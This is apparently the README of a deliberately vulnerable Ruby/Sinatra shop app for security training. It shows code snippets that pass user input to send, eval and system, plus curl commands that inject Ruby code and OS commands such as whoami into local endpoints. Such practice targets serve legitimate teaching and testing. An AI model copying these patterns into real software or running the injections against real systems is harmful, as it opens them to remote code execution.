# Vulnerable Ruby Web Application

This repository demonstrates a real-world Ruby web application with multiple injection vulnerabilities. Unlike security demos that show how to prevent attacks, this application contains actual exploitable vulnerabilities that can be triggered through HTTP requests, making it suitable for security testing, penetration testing practice, and vulnerability research.

## Vulnerability Overview

This e-commerce platform contains multiple serious security vulnerabilities:

### 1. Method Injection Vulnerability (`VulnerableCache`)

The `try_cache` method accepts ANY method name without validation:

```ruby
def self.try_cache(object, method_name, attribute = nil)
  # NO VALIDATION - This allows arbitrary method calls!
  object.send(method_name.to_sym)
end
```

- **Risk**: Arbitrary method invocation on objects
- **Impact**: Information disclosure, potential RCE
- **Exploitation**: Via HTTP parameters in multiple endpoints

### 2. Code Execution Vulnerability (`dynamic_call`)

Direct evaluation of user input as Ruby code:

```ruby
def self.dynamic_call(object, code_string)
  # This evaluates arbitrary Ruby code - MAJOR VULNERABILITY!
  eval("object.#{code_string}")
end
```

- **Risk**: Remote code execution
- **Impact**: Full system compromise
- **Exploitation**: Via `/user/profile?code=` parameter

### 3. Command Injection Vulnerability (`execute_command`)

Direct execution of system commands:

```ruby
def self.execute_command(command)
  # Directly execute system commands - COMMAND INJECTION!
  system(command)
end
```

- **Risk**: Operating system command execution
- **Impact**: System takeover
- **Exploitation**: Via `/admin/tools?command=` parameter

### 4. Step Injection in Checkout System

No validation of checkout steps:

```ruby
def advance_to_step(step_name)
  # NO VALIDATION - accepts any input including malicious code
  @checkout_step = step_name.to_s
end
```

- **Risk**: Arbitrary data injection
- **Impact**: Application logic bypass
- **Exploitation**: Via POST requests to checkout endpoints

### 5. Eval-based Code Execution

Multiple `eval()` calls throughout the application:

```ruby
def execute_step_code(code)
  # This evaluates arbitrary Ruby code - MAJOR VULNERABILITY!
  eval(code)
end
```

- **Risk**: Direct code evaluation
- **Impact**: Full application compromise
- **Exploitation**: Via `/checkout/execute` endpoint

## Running the Application

### Prerequisites

- Ruby 3.2+
- Bundler

### Installation

```bash
bundle install
```

### Running the Web Server

```bash
bundle exec rackup -p 4567
```

### Running Tests

```bash
bundle exec rspec
```

## Exploiting the Vulnerabilities

The application exposes multiple vulnerable endpoints that can be exploited via HTTP requests:

### Method Injection Vulnerabilities

**Product Search Method Injection:**
```bash
# Exploit method injection to call any method on Product objects
curl "http://localhost:4567/products/search?method=class"
curl "http://localhost:4567/products/search?method=methods" 
curl "http://localhost:4567/products/search?method=instance_variables"
```

**API Method Injection:**
```bash
# Call arbitrary methods on User, Product, or Order objects
curl "http://localhost:4567/api/call?object=user&method=class"
curl "http://localhost:4567/api/call?object=user&method=methods"
curl "http://localhost:4567/api/call?object=product&method=instance_variables"
```

### Code Execution Vulnerabilities

**User Profile Code Execution:**
```bash
# Execute arbitrary Ruby code in user context
curl "http://localhost:4567/user/profile?code=name.upcase"
curl "http://localhost:4567/user/profile?code=class.ancestors.first.name"
curl "http://localhost:4567/user/profile?code=2*21"
```

**Checkout Code Execution:**
```bash
# Execute arbitrary Ruby code via POST
curl -X POST "http://localhost:4567/checkout/execute" -d "code=puts 'pwned'"
curl -X POST "http://localhost:4567/checkout/execute" -d "code=File.exist?('/etc/passwd')"
```

### Command Injection Vulnerabilities

**Admin Tools Command Execution:**
```bash
# Execute arbitrary system commands
curl "http://localhost:4567/admin/tools?command=whoami"
curl "http://localhost:4567/admin/tools?command=pwd"
curl "http://localhost:4567/admin/tools?command=ls -la"
```

### Step Injection Vulnerabilities

**Checkout Step Manipulation:**
```bash
# Inject arbitrary data into checkout steps
curl -X POST "http://localhost:4567/checkout/custom" -d "step=malicious_payload"
curl -X POST "http://localhost:4567/checkout/custom" -d "step=system('whoami')"
```

### Example Exploitation Results

Successful exploits return JSON responses like:
```json
{
  "status": "success", 
  "message": "Code executed successfully",
  "result": "User"
}
```

## Vulnerability Testing

### Comprehensive Test Suite

- ✅ 35 passing vulnerability tests
- ✅ All injection patterns work as expected
- ✅ Dangerous operations execute successfully

### Confirmed Vulnerability Patterns

The application successfully executes these dangerous patterns:

- **Method Injection**: `object.send(user_input)` allows calling any method
- **Code Evaluation**: `eval(user_input)` executes arbitrary Ruby code  
- **Command Execution**: `system(user_input)` runs OS commands
- **Object Manipulation**: Direct access to Ruby object internals
- **File Operations**: Unrestricted file system access
- **Process Control**: Ability to spawn processes and manipulate environment

### Security Analysis

This application intentionally contains multiple critical vulnerabilities:
- ❌ No input validation or sanitization
- ❌ Direct eval() of user input
- ❌ Unrestricted method invocation
- ❌ Command injection vulnerabilities
- ❌ No access controls or authorization

## Application Architecture

```
├── app.rb                 # Vulnerable Sinatra web application
├── lib/
│   ├── secure_cache.rb    # VulnerableCache - method injection vulnerabilities
│   ├── checkout_system.rb # VulnerableCheckout - code execution vulnerabilities  
│   └── models.rb          # Basic domain models (User, Product, Order)
├── spec/                  # Vulnerability verification test suite
├── Gemfile               # Ruby dependencies
└── config.ru             # Rack web server configuration
```

## Vulnerability Categories

This application demonstrates multiple categories of web application vulnerabilities:

### 1. **Injection Vulnerabilities**
- Method injection via unvalidated `send()` calls
- Code injection via `eval()` execution
- Command injection via `system()` calls

### 2. **Insecure Direct Object References**
- Direct access to Ruby object methods and properties
- Unrestricted method enumeration and introspection

### 3. **Missing Input Validation**
- No sanitization of user input
- Direct assignment of user data to application state

### 4. **Insufficient Access Controls**
- Admin functions accessible without authentication
- No authorization checks on sensitive operations

### 5. **Information Disclosure**
- Method enumeration exposes internal application structure
- Error messages reveal system information
- Object introspection reveals sensitive data

## Educational Purpose

This application serves as a practical example for:
- **Security Testing**: Practice identifying and exploiting real vulnerabilities
- **Penetration Testing**: Realistic target for testing attack techniques  
- **Vulnerability Research**: Study common Ruby/Rails security anti-patterns
- **Security Training**: Hands-on experience with dangerous coding practices

⚠️ **WARNING**: This application contains serious security vulnerabilities and should only be used in isolated, controlled environments for educational purposes.